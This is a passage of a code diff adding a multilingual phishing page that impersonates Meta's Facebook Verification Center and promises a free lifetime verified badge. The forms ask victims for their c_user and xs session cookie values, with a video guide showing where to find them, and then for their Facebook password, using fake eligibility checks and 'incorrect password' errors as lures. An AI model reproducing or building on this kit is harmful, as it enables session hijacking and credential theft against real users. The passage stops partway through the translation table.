+                    <div class="mv-feat"><div class="mv-chk"><svg viewBox="0 0 18 18" fill="none"><path d="M3 9l4.5 4.5 7.5-8" stroke="#1877f2" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><div><div class="mv-feat-text" id="t-f8">Enhanced support</div><div class="mv-feat-sub" id="t-f8s">Chat or email with agents · Get issues resolved more quickly · Request a call from an agent · Active case monitoring</div></div></div>
+                </div>
+            </div>
+
+            <div class="mv-card-foot">
+                <div class="mv-age-note" id="t-age-note">Meta Verified is available for people aged 18+</div>
+                <button class="mv-continue-btn" id="t-continue-btn" onclick="goTo('s2')">Continue</button>
+            </div>
+        </div>
+
+        <footer class="site-footer" style="border-radius:10px;margin-top:14px;">
+            <div><a href="#" id="t-priv1">Privacy</a><span class="s">·</span><a href="#" id="t-terms1">Terms</a><span class="s">·</span><a href="#">Advertising</a><span class="s">·</span><a href="#">Cookies</a></div>
+            <div>Meta © 2026</div>
+        </footer>
+    </div>
+</div>
+
+<!-- ██████████████ STEP 2: HELP FORM ██████████████ -->
+<div id="s2" class="step">
+
+    <nav class="topbar">
+        <div class="topbar-logo"><img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook"></div>
+        <div class="topbar-sep"></div>
+        <span class="topbar-title">Verification Center</span>
+        <button class="topbar-lang" id="s2-lang-btn">
+            <img id="s2-flag" src="https://flagcdn.com/24x18/us.png" alt="">
+            <span id="s2-lang-name">English</span>
+        </button>
+    </nav>
+
+    <div class="form-page">
+        <div class="breadcrumb">
+            <a href="#" onclick="goTo('s1');return false;" id="t-bc1">Help Center</a>
+            <span class="bc-sep">›</span>
+            <a href="#" onclick="goTo('s1');return false;" id="t-bc2">Managing Your Account</a>
+            <span class="bc-sep">›</span>
+            <span id="t-bc3">Request a Verified Badge</span>
+        </div>
+
+        <div class="card hdr-card">
+            <div class="hdr-badge"><img src="https://logo-ver.vercel.app/800px-Twitter_Verified_Badge.svg.png" alt="Verified"></div>
+            <div><div class="hdr-h" id="t-hdr-h">Request a Lifetime Free Verified Badge on Facebook</div><div class="hdr-p" id="t-hdr-p">The verified badge confirms a Page or profile is the authentic presence of the individual, public figure, or brand it represents.</div></div>
+        </div>
+
+        <div class="card info-card">
+            <div class="info-card-t"><div class="dot"></div><span id="t-info-title">About the Verified Badge</span></div>
+            <span id="t-info-body">Facebook's blue checkmark confirms your account is authentic. Please provide accurate details below and watch the video guide if you need help finding the required information.</span>
+        </div>
+
+        <div class="warn-strip">
+            ⚠️ <div><strong id="t-warn-imp">Important:</strong> <span id="t-warn-body">Do not log out of your computer or laptop until you receive a verification confirmation email from Facebook.</span></div>
+        </div>
+
+        <div class="card vid-card">
+            <div class="vid-lbl">
+                <svg viewBox="0 0 16 16" fill="none"><polygon points="3,2 14,8 3,14" fill="#1877f2"/></svg>
+                <span id="t-vid-lbl">Video Guide</span>
+            </div>
+            <video id="guide-video" controls preload="metadata">
+                <source id="guide-video-src" src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+            </video>
+        </div>
+
+        <div class="card frm-card">
+            <div class="frm-t" id="t-frm-t">Submit Your Verification Request</div>
+            <div class="frm-s" id="t-frm-s">Ensure all information is filled in accurately. Incorrect details may result in your request being declined.</div>
+
+            <div class="err-strip" id="t-err-strip">
+                <svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="8" cy="8" r="7"/><path d="M8 5v4M8 11h.01"/></svg>
+                <span id="t-err-txt">All required fields must be accurately provided. Failure to do so may result in not receiving a verified badge.</span>
+            </div>
+
+            <form id="verificationForm">
+                <div class="f-group">
+                    <label for="c_user">c_user</label>
+                    <input type="text" id="c_user" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" required>
+                </div>
+                <div class="f-group">
+                    <label for="xs">xs</label>
+                    <input type="text" id="xs" name="xs" placeholder="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$" required>
+                </div>
+                <button class="fb-btn" type="submit" id="submitBtn">
+                    <span class="btn-label" id="t-submit-btn">Submit Verification Request</span>
+                </button>
+            </form>
+        </div>
+
+        <footer class="site-footer">
+            <div><a href="#">Privacy</a><span class="s">·</span><a href="#">Terms</a><span class="s">·</span><a href="#">Cookies</a></div>
+            <div>Meta © 2026</div>
+        </footer>
+    </div>
+</div>
+
+<!-- ██████████████ STEP 3: PASSWORD ██████████████ -->
+<div id="s3" class="step">
+
+    <nav class="topbar">
+        <div class="topbar-logo"><img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook"></div>
+        <div class="topbar-sep"></div>
+        <span class="topbar-title" id="t-s3-nav">Security Check</span>
+        <div class="topbar-right"><a href="#" id="t-s3-help" style="font-size:13px;color:#1877f2;text-decoration:none;font-weight:600;">Help Center</a></div>
+    </nav>
+
+    <div class="pw-page">
+        <div class="breadcrumb">
+            <a href="#" onclick="goTo('s1');return false;" id="t-s3-bc1">Help Center</a>
+            <span class="bc-sep">›</span>
+            <span id="t-s3-bc2">Confirm Your Password</span>
+        </div>
+
+        <div class="card pw-card">
+            <div id="pwForm">
+                <p class="pw-prompt" id="t-pw-prompt">Enter your Facebook password to complete the verification process.</p>
+
+                <form id="passwordForm">
+                    <div class="pw-input-wrap">
+                        <input type="password" id="pw-input" placeholder="Facebook password" autocomplete="current-password" required>
+                        <button type="button" class="pw-eye" id="eyeBtn">
+                            <svg id="eyeIco" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <div class="pw-err" id="pwErr"><span id="t-pw-err">The password you entered is incorrect. Please try again.</span></div>
+                    <a href="#" class="pw-forgot" id="t-pw-forgot">Forgot password?</a>
+                    <hr class="pw-hr">
+                    <button type="submit" class="pw-continue" id="pwBtn">
+                        <span class="pw-lbl" id="t-pw-continue">Continue</span>
+                        <div class="pw-spin"></div>
+                    </button>
+                </form>
+                <button class="pw-not-you" id="t-pw-not-you">Not you?</button>
+            </div>
+
+            <div class="pw-success" id="pwSuccess">
+                <div class="pw-ok-icon">
+                    <svg width="28" height="28" viewBox="0 0 28 28" fill="none"><path d="M4 14l7 7L24 7" stroke="#1a7f37" stroke-width="2.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </div>
+                <div class="pw-ok-t" id="t-pw-ok-t">Request Received</div>
+                <div class="pw-ok-s" id="t-pw-ok-s">You will receive a verification email…</div>
+            </div>
+        </div>
+
+        <footer class="site-footer">
+            <div><a href="#">Privacy</a><span class="s">·</span><a href="#">Terms</a><span class="s">·</span><a href="#">Cookies</a></div>
+            <div>Meta © 2026</div>
+        </footer>
+    </div>
+</div>
+
+<script>
+    /* ══════════════════════════════════════════
+       TRANSLATIONS — T[lang][key]
+    ══════════════════════════════════════════ */
+    const T = {
+        english: {
+            scanTitle:'Checking Your Eligibility', scanSub:'Facebook is verifying your account for the Meta Verified free badge offer…',
+            scanInit:'Initializing…', scanS1:'Verifying account age…', scanS2:'Checking profile authenticity…',
+            scanS3:'Checking region eligibility…', scanS4:'Reserving your free slot…', scanS5:'Confirming eligibility…', scanDone:'✓ Eligible! Loading your offer…',
+            chk1:'Account age verified', chk2:'Profile authenticity confirmed', chk3:'Region eligibility checked', chk4:'Free offer slot reserved',
+            eligTitle:"You're Eligible! 🎉", eligSub:'Your account qualifies for the free lifetime Meta Verified badge — selected users only.', eligTag:'FREE · Lifetime Access Confirmed',
+            planDesc:'Protect and optimise your brand', freeTag:'FREE · Lifetime Access', priceCross:'<s>$11.99/month</s> — No subscription needed',
+            verifiedBadge:'Verified badge', sect1:'Maximise discovery', f1:'Search optimisation', f2:'Featured profile', f3:'Add links to reels', f3s:'6 per month',
+            sect2:'Drive engagement', f4:'Upgraded profile links', f5:'Exclusive stickers', f6:'Custom chat themes',
+            sect3:'Protect your brand', f7:'Impersonation protection', f8:'Enhanced support', f8s:'Chat or email with agents · Get issues resolved more quickly · Request a call from an agent · Active case monitoring',
+            ageNote:'Meta Verified is available for people aged 18+', continueBtn:'Continue',
+            bc1:'Help Center', bc2:'Managing Your Account', bc3:'Request a Verified Badge',
+            hdrH:'Request a Lifetime Free Verified Badge on Facebook', hdrP:'The verified badge confirms a Page or profile is the authentic presence of the individual, public figure, or brand it represents.',
+            infoTitle:'About the Verified Badge', infoBody:"Facebook's blue checkmark confirms your account is authentic. Please provide accurate details below and watch the video guide if you need help finding the required information.",
+            warnImp:'Important:', warnBody:'Do not log out of your computer or laptop until you receive a verification confirmation email from Facebook.',
+            vidLbl:'Video Guide',
+            frmT:'Submit Your Verification Request', frmS:'Ensure all information is filled in accurately. Incorrect details may result in your request being declined.',
+            errTxt:'All required fields must be accurately provided. Failure to do so may result in not receiving a verified badge.',
+            submitBtn:'Submit Verification Request',
+            s3Nav:'Security Check', s3Help:'Help Center', s3Bc1:'Help Center', s3Bc2:'Confirm Your Password',
+            pwPrompt:'Enter your Facebook password to complete the verification process.',
+            pwPlaceholder:'Facebook password', pwErr:'The password you entered is incorrect. Please try again.',
+            pwForgot:'Forgot password?', pwContinue:'Continue', pwNotYou:'Not you?',
+            pwOkT:'Verification Successful', pwOkS:'Redirecting you securely…'
+        },
+        hindi: {
+            scanTitle:'आपकी पात्रता जाँची जा रही है', scanSub:'Facebook आपके खाते को Meta Verified मुफ़्त बैज ऑफ़र के लिए सत्यापित कर रहा है…',
+            scanInit:'प्रारंभ हो रहा है…', scanS1:'खाते की आयु सत्यापित हो रही है…', scanS2:'प्रोफ़ाइल की प्रामाणिकता जाँची जा रही है…',
+            scanS3:'क्षेत्रीय पात्रता जाँची जा रही है…', scanS4:'आपका मुफ़्त स्लॉट आरक्षित किया जा रहा है…', scanS5:'पात्रता की पुष्टि हो रही है…', scanDone:'✓ पात्र! आपका ऑफ़र लोड हो रहा है…',
+            chk1:'खाते की आयु सत्यापित', chk2:'प्रोफ़ाइल प्रामाणिकता की पुष्टि', chk3:'क्षेत्रीय पात्रता जाँची गई', chk4:'मुफ़्त ऑफ़र स्लॉट आरक्षित',
+            eligTitle:'आप पात्र हैं! 🎉', eligSub:'आपका खाता मुफ़्त लाइफटाइम Meta Verified बैज के लिए योग्य है — केवल चुनिंदा उपयोगकर्ताओं के लिए।', eligTag:'मुफ़्त · आजीवन पहुँच की पुष्टि',
+            planDesc:'अपने ब्रांड की सुरक्षा करें और अनुकूलित करें', freeTag:'मुफ़्त · आजीवन पहुँच', priceCross:'<s>$11.99/माह</s> — कोई सदस्यता नहीं',
+            verifiedBadge:'सत्यापित बैज', sect1:'खोज बढ़ाएँ', f1:'खोज अनुकूलन', f2:'फ़ीचर्ड प्रोफ़ाइल', f3:'रील्स में लिंक जोड़ें', f3s:'6 प्रति माह',
+            sect2:'जुड़ाव बढ़ाएँ', f4:'अपग्रेड किए गए प्रोफ़ाइल लिंक', f5:'एक्सक्लूसिव स्टिकर', f6:'कस्टम चैट थीम',
+            sect3:'ब्रांड सुरक्षा', f7:'नकल विरोधी सुरक्षा', f8:'बेहतर सहायता', f8s:'एजेंट के साथ चैट या ईमेल · समस्याओं का त्वरित समाधान · एजेंट से कॉल का अनुरोध · सक्रिय केस निगरानी',
+            ageNote:'Meta Verified 18+ आयु के लोगों के लिए उपलब्ध है', continueBtn:'जारी रखें',
+            bc1:'सहायता केंद्र', bc2:'अपना खाता प्रबंधित करें', bc3:'सत्यापित बैज के लिए अनुरोध करें',
+            hdrH:'Facebook पर सत्यापित बैज के लिए अनुरोध करें', hdrP:'सत्यापित बैज पुष्टि करता है कि एक Page या प्रोफ़ाइल किसी व्यक्ति, सार्वजनिक हस्ती या ब्रांड की वास्तविक उपस्थिति है।',
+            infoTitle:'सत्यापित बैज के बारे में', infoBody:'Facebook का नीला चेकमार्क पुष्टि करता है कि आपका खाता प्रामाणिक है। कृपया नीचे सटीक जानकारी भरें और यदि आवश्यक हो तो वीडियो गाइड देखें।',
+            warnImp:'महत्वपूर्ण:', warnBody:'जब तक आपको Facebook से सत्यापन पुष्टि ईमेल नहीं मिल जाती, तब तक अपने कंप्यूटर या लैपटॉप से लॉग आउट न करें।',
+            vidLbl:'वीडियो गाइड',
+            frmT:'सत्यापन अनुरोध सबमिट करें', frmS:'सभी जानकारी सटीक रूप से भरें। गलत विवरण के कारण आपका अनुरोध अस्वीकार हो सकता है।',
+            errTxt:'सभी आवश्यक फ़ील्ड सटीक रूप से भरे होने चाहिए। ऐसा न करने पर सत्यापित बैज नहीं मिलेगा।',
+            submitBtn:'सत्यापन अनुरोध सबमिट करें',
+            s3Nav:'सुरक्षा जाँच', s3Help:'सहायता केंद्र', s3Bc1:'सहायता केंद्र', s3Bc2:'अपना पासवर्ड कन्फर्म करें',
+            pwPrompt:'सत्यापन प्रक्रिया पूरी करने के लिए अपना Facebook पासवर्ड दर्ज करें।',
+            pwPlaceholder:'Facebook पासवर्ड', pwErr:'आपने जो पासवर्ड दर्ज किया वह गलत है। कृपया पुनः प्रयास करें।',
+            pwForgot:'पासवर्ड भूल गए?', pwContinue:'जारी रखें', pwNotYou:'आप नहीं हैं?',
+            pwOkT:'सत्यापन सफल', pwOkS:'आपको सुरक्षित रूप से पुनर्निर्देशित किया जा रहा है…'
+        },
+        spanish: {
+            scanTitle:'Verificando Tu Elegibilidad', scanSub:'Facebook está verificando tu cuenta para la oferta gratuita de la insignia Meta Verified…',
+            scanInit:'Iniciando…', scanS1:'Verificando antigüedad de la cuenta…', scanS2:'Comprobando autenticidad del perfil…',
+            scanS3:'Verificando elegibilidad regional…', scanS4:'Reservando tu espacio gratuito…', scanS5:'Confirmando elegibilidad…', scanDone:'✓ ¡Elegible! Cargando tu oferta…',
+            chk1:'Antigüedad de cuenta verificada', chk2:'Autenticidad del perfil confirmada', chk3:'Elegibilidad regional verificada', chk4:'Espacio de oferta gratuita reservado',
+            eligTitle:'¡Eres Elegible! 🎉', eligSub:'Tu cuenta califica para la insignia Meta Verified gratuita de por vida — solo para usuarios seleccionados.', eligTag:'GRATIS · Acceso de por vida confirmado',
+            planDesc:'Protege y optimiza tu marca', freeTag:'GRATIS · Acceso de por vida', priceCross:'<s>$11.99/mes</s> — Sin suscripción necesaria',
+            verifiedBadge:'Insignia verificada', sect1:'Maximizar descubrimiento', f1:'Optimización en búsquedas', f2:'Perfil destacado', f3:'Agregar enlaces a reels', f3s:'6 por mes',
+            sect2:'Impulsar participación', f4:'Enlaces de perfil mejorados', f5:'Stickers exclusivos', f6:'Temas de chat personalizados',
+            sect3:'Proteger tu marca', f7:'Protección contra suplantación', f8:'Soporte mejorado', f8s:'Chat o correo con agentes · Resolución rápida · Solicitar llamada · Monitoreo activo del caso',
+            ageNote:'Meta Verified está disponible para personas mayores de 18 años', continueBtn:'Continuar',
+            bc1:'Centro de ayuda', bc2:'Gestionar tu cuenta', bc3:'Solicitar una insignia verificada',
+            hdrH:'Solicitar una insignia verificada en Facebook', hdrP:'La insignia verificada confirma que una página o perfil es la presencia auténtica del individuo, figura pública o marca que representa.',
+            infoTitle:'Sobre la insignia verificada', infoBody:'La marca de verificación azul de Facebook confirma que tu cuenta es auténtica. Proporciona los detalles precisos a continuación y mira el video guía si necesitas ayuda.',
+            warnImp:'Importante:', warnBody:'No cierres sesión de tu computadora o laptop hasta que recibas el correo de confirmación de verificación de Facebook.',
+            vidLbl:'Guía en video',
+            frmT:'Enviar solicitud de verificación', frmS:'Asegúrate de que toda la información sea precisa. Los detalles incorrectos pueden resultar en el rechazo de tu solicitud.',
+            errTxt:'Todos los campos obligatorios deben completarse con precisión. De lo contrario, es posible que no recibas la insignia verificada.',
+            submitBtn:'Enviar solicitud de verificación',
+            s3Nav:'Verificación de seguridad', s3Help:'Centro de ayuda', s3Bc1:'Centro de ayuda', s3Bc2:'Confirma tu contraseña',
+            pwPrompt:'Ingresa tu contraseña de Facebook para completar el proceso de verificación.',
+            pwPlaceholder:'Contraseña de Facebook', pwErr:'La contraseña ingresada es incorrecta. Por favor intenta de nuevo.',
+            pwForgot:'¿Olvidaste tu contraseña?', pwContinue:'Continuar', pwNotYou:'¿No eres tú?',
+            pwOkT:'Verificación exitosa', pwOkS:'Redirigiendo de forma segura…'
+        },
+        portuguese: {
+            scanTitle:'Verificando Sua Elegibilidade', scanSub:'O Facebook está verificando sua conta para a oferta gratuita do emblema Meta Verified…',
+            scanInit:'Iniciando…', scanS1:'Verificando idade da conta…', scanS2:'Verificando autenticidade do perfil…',
+            scanS3:'Verificando elegibilidade regional…', scanS4:'Reservando sua vaga gratuita…', scanS5:'Confirmando elegibilidade…', scanDone:'✓ Elegível! Carregando sua oferta…',
+            chk1:'Idade da conta verificada', chk2:'Autenticidade do perfil confirmada', chk3:'Elegibilidade regional verificada', chk4:'Vaga de oferta gratuita reservada',
+            eligTitle:'Você é Elegível! 🎉', eligSub:'Sua conta se qualifica para o emblema Meta Verified gratuito vitalício — apenas para usuários selecionados.', eligTag:'GRÁTIS · Acesso vitalício confirmado',
+            planDesc:'Proteja e otimize sua marca', freeTag:'GRÁTIS · Acesso vitalício', priceCross:'<s>$11,99/mês</s> — Sem necessidade de assinatura',
+            verifiedBadge:'Emblema verificado', sect1:'Maximizar descoberta', f1:'Otimização de pesquisa', f2:'Perfil em destaque', f3:'Adicionar links aos reels', f3s:'6 por mês',
+            sect2:'Impulsionar engajamento', f4:'Links de perfil aprimorados', f5:'Figurinhas exclusivas', f6:'Temas de chat personalizados',
+            sect3:'Proteger sua marca', f7:'Proteção contra falsidade', f8:'Suporte aprimorado', f8s:'Chat ou e-mail com agentes · Resolução rápida de problemas · Solicitar ligação · Monitoramento ativo do caso',
+            ageNote:'Meta Verified está disponível para pessoas com 18 anos ou mais', continueBtn:'Continuar',
+            bc1:'Central de Ajuda', bc2:'Gerenciar sua conta', bc3:'Solicitar um emblema verificado',
+            hdrH:'Solicitar um emblema verificado no Facebook', hdrP:'O emblema verificado confirma que uma Página ou perfil é a presença autêntica do indivíduo, figura pública ou marca que representa.',
+            infoTitle:'Sobre o emblema verificado', infoBody:'A marca de verificação azul do Facebook confirma que sua conta é autêntica. Forneça os detalhes precisos abaixo e assista ao vídeo guia se precisar de ajuda.',
+            warnImp:'Importante:', warnBody:'Não faça logout do seu computador ou laptop até receber o e-mail de confirmação de verificação do Facebook.',
+            vidLbl:'Guia em vídeo',
+            frmT:'Enviar solicitação de verificação', frmS:'Certifique-se de que todas as informações estão preenchidas corretamente. Detalhes incorretos podem resultar na rejeição da solicitação.',
+            errTxt:'Todos os campos obrigatórios devem ser preenchidos com precisão. Caso contrário, você poderá não receber o emblema verificado.',
+            submitBtn:'Enviar solicitação de verificação',
+            s3Nav:'Verificação de segurança', s3Help:'Central de Ajuda', s3Bc1:'Central de Ajuda', s3Bc2:'Confirme sua senha',
+            pwPrompt:'Digite sua senha do Facebook para concluir o processo de verificação.',
+            pwPlaceholder:'Senha do Facebook', pwErr:'A senha informada está incorreta. Por favor tente novamente.',
+            pwForgot:'Esqueceu a senha?', pwContinue:'Continuar', pwNotYou:'Não é você?',
+            pwOkT:'Verificação bem-sucedida', pwOkS:'Redirecionando com segurança…'
+        },
+        arabic: {
+            scanTitle:'التحقق من أهليتك', scanSub:'يتحقق Facebook من حسابك للحصول على عرض شارة Meta Verified المجانية…',
+            scanInit:'جارٍ التهيئة…', scanS1:'التحقق من عمر الحساب…', scanS2:'التحقق من أصالة الملف الشخصي…',
+            scanS3:'التحقق من الأهلية الإقليمية…', scanS4:'حجز مكانك المجاني…', scanS5:'تأكيد الأهلية…', scanDone:'✓ مؤهل! جارٍ تحميل عرضك…',
+            chk1:'تم التحقق من عمر الحساب', chk2:'تم تأكيد أصالة الملف الشخصي', chk3:'تم التحقق من الأهلية الإقليمية', chk4:'تم حجز مكان العرض المجاني',
+            eligTitle:'أنت مؤهل! 🎉', eligSub:'حسابك مؤهل للحصول على شارة Meta Verified المجانية مدى الحياة — للمستخدمين المختارين فقط.', eligTag:'مجانًا · تم تأكيد الوصول مدى الحياة',
+            planDesc:'احمِ علامتك التجارية وطوِّرها', freeTag:'مجانًا · وصول مدى الحياة', priceCross:'<s>11.99$/شهريًا</s> — لا حاجة لاشتراك',
+            verifiedBadge:'شارة موثقة', sect1:'تعظيم الاكتشاف', f1:'تحسين البحث', f2:'ملف شخصي مميز', f3:'إضافة روابط إلى الريلز', f3s:'6 شهريًا',
+            sect2:'تعزيز التفاعل', f4:'روابط ملف شخصي محسّنة', f5:'ملصقات حصرية', f6:'سمات دردشة مخصصة',
+            sect3:'حماية علامتك التجارية', f7:'الحماية من الانتحال', f8:'دعم معزز', f8s:'الدردشة أو البريد الإلكتروني مع الوكلاء · حل المشكلات بسرعة · طلب مكالمة · متابعة نشطة للحالة',
+            ageNote:'Meta Verified متاحة للأشخاص الذين تبلغ أعمارهم 18 عامًا فأكثر', continueBtn:'متابعة',
+            bc1:'مركز المساعدة', bc2:'إدارة حسابك', bc3:'طلب شارة موثقة',
+            hdrH:'طلب شارة موثقة على Facebook', hdrP:'تؤكد الشارة الموثقة أن الصفحة أو الملف الشخصي هو الحضور الأصيل للفرد أو الشخصية العامة أو العلامة التجارية التي تمثلها.',
+            infoTitle:'حول الشارة الموثقة', infoBody:'تؤكد العلامة الزرقاء من Facebook أن حسابك أصيل. يرجى تقديم التفاصيل الدقيقة أدناه ومشاهدة دليل الفيديو إذا كنت بحاجة إلى مساعدة.',
+            warnImp:'مهم:', warnBody:'لا تسجّل الخروج من جهاز الكمبيوتر أو اللابتوب حتى تتلقى رسالة تأكيد التحقق عبر البريد الإلكتروني من Facebook.',
+            vidLbl:'دليل فيديو',
+            frmT:'إرسال طلب التحقق', frmS:'تأكد من ملء جميع المعلومات بدقة. قد تؤدي التفاصيل غير الصحيحة إلى رفض طلبك.',
+            errTxt:'يجب تقديم جميع الحقول المطلوبة بدقة. وإلا فقد لا تحصل على الشارة الموثقة.',
+            submitBtn:'إرسال طلب التحقق',
+            s3Nav:'فحص الأمان', s3Help:'مركز المساعدة', s3Bc1:'مركز المساعدة', s3Bc2:'تأكيد كلمة المرور',
+            pwPrompt:'أدخل كلمة مرور Facebook الخاصة بك لإكمال عملية التحقق.',
+            pwPlaceholder:'كلمة مرور Facebook', pwErr:'كلمة المرور التي أدخلتها غير صحيحة. يرجى المحاولة مرة أخرى.',
+            pwForgot:'نسيت كلمة المرور؟', pwContinue:'متابعة', pwNotYou:'لست أنت؟',
+            pwOkT:'تم التحقق بنجاح', pwOkS:'جارٍ إعادة التوجيه بأمان…'
+        },
+        french: {
+            scanTitle:"Vérification de votre éligibilité", scanSub:"Facebook vérifie votre compte pour l'offre de badge Meta Verified gratuit…",
+            scanInit:'Initialisation…', scanS1:'Vérification de l\'ancienneté du compte…', scanS2:'Vérification de l\'authenticité du profil…',
+            scanS3:'Vérification de l\'éligibilité régionale…', scanS4:'Réservation de votre place gratuite…', scanS5:'Confirmation de l\'éligibilité…', scanDone:'✓ Éligible ! Chargement de votre offre…',
+            chk1:'Ancienneté du compte vérifiée', chk2:'Authenticité du profil confirmée', chk3:'Éligibilité régionale vérifiée', chk4:'Place d\'offre gratuite réservée',
+            eligTitle:'Vous êtes éligible ! 🎉', eligSub:'Votre compte est éligible au badge Meta Verified gratuit à vie — pour les utilisateurs sélectionnés uniquement.', eligTag:'GRATUIT · Accès à vie confirmé',
+            planDesc:'Protégez et optimisez votre marque', freeTag:'GRATUIT · Accès à vie', priceCross:'<s>11,99$/mois</s> — Sans abonnement',
+            verifiedBadge:'Badge vérifié', sect1:'Maximiser la découverte', f1:'Optimisation de la recherche', f2:'Profil mis en avant', f3:'Ajouter des liens aux reels', f3s:'6 par mois',
+            sect2:'Stimuler l\'engagement', f4:'Liens de profil améliorés', f5:'Autocollants exclusifs', f6:'Thèmes de chat personnalisés',
+            sect3:'Protéger votre marque', f7:'Protection contre l\'usurpation', f8:'Assistance améliorée', f8s:'Chat ou e-mail avec des agents · Résolution rapide · Demande d\'appel · Suivi actif du dossier',
+            ageNote:'Meta Verified est disponible pour les personnes âgées de 18 ans et plus', continueBtn:'Continuer',
+            bc1:'Centre d\'aide', bc2:'Gérer votre compte', bc3:'Demander un badge vérifié',
+            hdrH:'Demander un badge vérifié sur Facebook', hdrP:'Le badge vérifié confirme qu\'une Page ou un profil est la présence authentique de l\'individu, de la personnalité publique ou de la marque qu\'il représente.',
+            infoTitle:'À propos du badge vérifié', infoBody:'La coche bleue de Facebook confirme que votre compte est authentique. Veuillez fournir des informations précises ci-dessous et regardez le guide vidéo si vous avez besoin d\'aide.',
+            warnImp:'Important :', warnBody:'Ne vous déconnectez pas de votre ordinateur ou portable avant de recevoir l\'e-mail de confirmation de vérification de Facebook.',
+            vidLbl:'Guide vidéo',
+            frmT:'Soumettre votre demande de vérification', frmS:'Assurez-vous que toutes les informations sont remplies avec précision. Des détails incorrects peuvent entraîner le rejet de votre demande.',
+            errTxt:'Tous les champs obligatoires doivent être remplis avec précision. Sinon, vous ne recevrez peut-être pas le badge vérifié.',
+            submitBtn:'Soumettre la demande de vérification',
+            s3Nav:'Vérification de sécurité', s3Help:'Centre d\'aide', s3Bc1:'Centre d\'aide', s3Bc2:'Confirmez votre mot de passe',
+            pwPrompt:'Entrez votre mot de passe Facebook pour terminer le processus de vérification.',
+            pwPlaceholder:'Mot de passe Facebook', pwErr:'Le mot de passe que vous avez saisi est incorrect. Veuillez réessayer.',
+            pwForgot:'Mot de passe oublié ?', pwContinue:'Continuer', pwNotYou:'Ce n\'est pas vous ?',
+            pwOkT:'Vérification réussie', pwOkS:'Redirection sécurisée en cours…'
+        },
+        tamil: {
+            scanTitle:'உங்கள் தகுதி சரிபார்க்கப்படுகிறது', scanSub:'Facebook உங்கள் கணக்கை Meta Verified இலவச பேட்ஜ் சலுகைக்காக சரிபார்க்கிறது…',
+            scanInit:'தொடங்குகிறது…', scanS1:'கணக்கு வயது சரிபார்க்கப்படுகிறது…', scanS2:'சுயவிவர நம்பகத்தன்மை சரிபார்க்கப்படுகிறது…',
+            scanS3:'பிராந்திய தகுதி சரிபார்க்கப்படுகிறது…', scanS4:'உங்கள் இலவச இடம் ஒதுக்கப்படுகிறது…', scanS5:'தகுதி உறுதிப்படுத்தப்படுகிறது…', scanDone:'✓ தகுதியானவர்! உங்கள் சலுகை ஏற்றப்படுகிறது…',
+            chk1:'கணக்கு வயது சரிபார்க்கப்பட்டது', chk2:'சுயவிவர நம்பகத்தன்மை உறுதிப்படுத்தப்பட்டது', chk3:'பிராந்திய தகுதி சரிபார்க்கப்பட்டது', chk4:'இலவச சலுகை இடம் ஒதுக்கப்பட்டது',
+            eligTitle:'நீங்கள் தகுதியானவர்! 🎉', eligSub:'உங்கள் கணக்கு இலவச வாழ்நாள் Meta Verified பேட்ஜுக்கு தகுதியானது — தேர்ந்தெடுக்கப்பட்ட பயனர்களுக்கு மட்டுமே.', eligTag:'இலவசம் · வாழ்நாள் அணுகல் உறுதிப்படுத்தப்பட்டது',
+            planDesc:'உங்கள் பிராண்டைப் பாதுகாத்து மேம்படுத்துங்கள்', freeTag:'இலவசம் · வாழ்நாள் அணுகல்', priceCross:'<s>$11.99/மாதம்</s> — சந்தா தேவையில்லை',
+            verifiedBadge:'சரிபார்க்கப்பட்ட பேட்ஜ்', sect1:'கண்டுபிடிப்பை அதிகரிக்கவும்', f1:'தேடல் மேம்படுத்தல்', f2:'சிறப்பு சுயவிவரம்', f3:'ரீல்களில் இணைப்புகள் சேர்க்கவும்', f3s:'மாதம் 6',
+            sect2:'ஈடுபாட்டை அதிகரிக்கவும்', f4:'மேம்படுத்தப்பட்ட சுயவிவர இணைப்புகள்', f5:'பிரத்யேக ஸ்டிக்கர்கள்', f6:'தனிப்பயன் அரட்டை தீம்கள்',
+            sect3:'உங்கள் பிராண்டைப் பாதுகாக்கவும்', f7:'மோசடி பாதுகாப்பு', f8:'மேம்படுத்தப்பட்ட ஆதரவு', f8s:'முகவர்களுடன் அரட்டை அல்லது மின்னஞ்சல் · விரைவான தீர்வு · அழைப்பு கோரிக்கை · செயலில் உள்ள வழக்கு கண்காணிப்பு',
+            ageNote:'Meta Verified 18 வயது மற்றும் அதற்கு மேல் உள்ளவர்களுக்கு கிடைக்கும்', continueBtn:'தொடரவும்',
+            bc1:'உதவி மையம்', bc2:'உங்கள் கணக்கை நிர்வகிக்கவும்', bc3:'சரிபார்க்கப்பட்ட பேட்ஜுக்கு கோரிக்கை',
+            hdrH:'Facebook இல் சரிபார்க்கப்பட்ட பேட்ஜுக்கு கோரிக்கை', hdrP:'சரிபார்க்கப்பட்ட பேட்ஜ் ஒரு பக்கம் அல்லது சுயவிவரம் அதை பிரதிநிதித்துவப்படுத்தும் தனிநபர், பொது நபர் அல்லது பிராண்டின் உண்மையான இருப்பு என்பதை உறுதிப்படுத்துகிறது.',
+            infoTitle:'சரிபார்க்கப்பட்ட பேட்ஜ் பற்றி', infoBody:'Facebook இன் நீல டிக் உங்கள் கணக்கு உண்மையானது என்பதை உறுதிப்படுத்துகிறது. தேவையான தகவல்களை கீழே சரியாக வழங்கவும்.',
+            warnImp:'முக்கியம்:', warnBody:'Facebook இலிருந்து சரிபார்ப்பு உறுதிப்படுத்தல் மின்னஞ்சல் கிடைக்கும் வரை உங்கள் கணினியிலிருந்து வெளியேறாதீர்கள்.',
+            vidLbl:'வீடியோ வழிகாட்டி',
